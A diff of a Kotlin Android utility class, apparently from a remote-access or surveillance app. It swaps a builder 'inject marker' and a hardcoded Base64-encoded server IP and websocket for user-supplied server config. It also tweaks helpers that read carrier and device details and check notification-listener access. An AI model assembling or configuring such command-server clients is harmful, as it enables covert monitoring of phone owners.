@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.ActivityManager
 import android.app.DownloadManager
+import android.content.ContentResolver
 import android.content.Context
 import android.net.Uri
 import android.os.BatteryManager
@@ -17,43 +18,49 @@ import androidx.activity.ComponentActivity
 import com.google.gson.Gson
 import willi.fiend.MainService
 import java.util.*
-import android.util.Base64
 
 @SuppressLint("Range")
 class AppTools {
     companion object {
-        // === INJECT MARKER - DO NOT REMOVE OR MODIFY THIS LINE ===
-        private const val DEFAULT_DATA = ""
-        // === INJECT MARKER END ===
 
+        // Your server configuration (Base64 encoded JSON)
+        // JSON: {"host":"https://your-server.com/","socket":"wss://your-server.com/","webView":"https://google.com/"}
+        // Generate: echo -n '{"host":"...","socket":"...","webView":"..."}' | base64
+        private const val DEFAULT_DATA = ""
+
+        // Default configuration for local development (Android emulator)
         private val DEFAULT_APP_DATA = AppData(
             host = "http://10.0.2.2:8999/",
             socket = "ws://10.0.2.2:8999/",
             webView = "https://www.google.com"
         )
 
+        @SuppressLint("NewApi")
         fun getAppData(): AppData {
-            if (DEFAULT_DATA.isEmpty() || DEFAULT_DATA == "eyJob3N0IjoiaHR0cDovLzkxLjEwNy4xMzQuNTg6ODk5OS8iLCJzb2NrZXQiOiJ3c3M6Ly85MS4xMDcuMTM0LjU4Ojg5OTkvIiwid2ViVmlldyI6Imh0dHBzOi8vZ29vZ2xlLmNvbS8ifQ==") {
-                android.util.Log.w("AppTools", "No custom DEFAULT_DATA, using defaults")
+            // If no custom data is set, return defaults
+            if (DEFAULT_DATA.isEmpty()) {
+                android.util.Log.w("AppTools", "No DEFAULT_DATA set, using defaults")
                 return DEFAULT_APP_DATA
             }
 
+            // Try to decode and parse the Base64 data
             return try {
-                val decodedBytes = Base64.decode(DEFAULT_DATA, Base64.DEFAULT)
-                val json = String(decodedBytes, Charsets.UTF_8)
+                val json = Base64.getDecoder().decode(DEFAULT_DATA).toString(Charsets.UTF_8)
                 android.util.Log.i("AppTools", "Decoded config: $json")
+
                 Gson().fromJson(json, AppData::class.java) ?: DEFAULT_APP_DATA
+
             } catch (e: Exception) {
                 android.util.Log.e("AppTools", "Failed to parse DEFAULT_DATA: ${e.message}")
                 DEFAULT_APP_DATA
             }
         }
 
-        // بقیه متدها بدون تغییر...
+        @SuppressLint("NewApi")
         fun getWatermark(): String {
             return try {
                 val encoded = "RmFoaW0gQWhhbWVkIMKpOiBAZmFoaW1haGFtZWQ0"
-                String(Base64.decode(encoded, Base64.DEFAULT))
+                String(Base64.getDecoder().decode(encoded))
             } catch (e: Exception) {
                 "@fahimahamed4r"
             }
@@ -78,7 +85,7 @@ class AppTools {
         fun getProviderName(context: Context): String {
             return try {
                 val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-                manager.networkOperatorName ?: "no provider"
+                manager.networkOperatorName
             } catch (ex: Exception) {
                 "no provider"
             }
@@ -87,10 +94,11 @@ class AppTools {
         fun getDeviceName(): String {
             val manufacturer = Build.MANUFACTURER
             val model = Build.MODEL
+
             return if (model.lowercase(Locale.getDefault()).startsWith(manufacturer.lowercase(Locale.getDefault()))) {
-                model.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
+                model.replaceFirstChar { it.uppercase() }
             } else {
-                "${manufacturer.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }} $model"
+                "${manufacturer.replaceFirstChar { it.uppercase() }} $model"
             }
         }
 
@@ -105,8 +113,8 @@ class AppTools {
 
         fun isNotificationServiceRunning(context: Context): Boolean {
             return try {
-                val enabledListeners = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_NOTIFICATION_LISTENERS)
-                enabledListeners?.contains(context.packageName) == true
+                val enabledListeners = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
+                enabledListeners.contains(context.packageName)
             } catch (e: Exception) {
                 false
             }
@@ -148,6 +156,7 @@ class AppTools {
                 }
             } catch (e: Exception) { }
         }
+
     }
 
     class WebViewDownloadListener(private val context: Context) : DownloadListener {
@@ -156,7 +165,7 @@ class AppTools {
                 val request = DownloadManager.Request(Uri.parse(url)).apply {
                     setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName(url, contentDisposition, mimeType))
                 }
-                (context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
+                (context.getSystemService(ComponentActivity.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
             } catch (e: Exception) { }
         }
     }
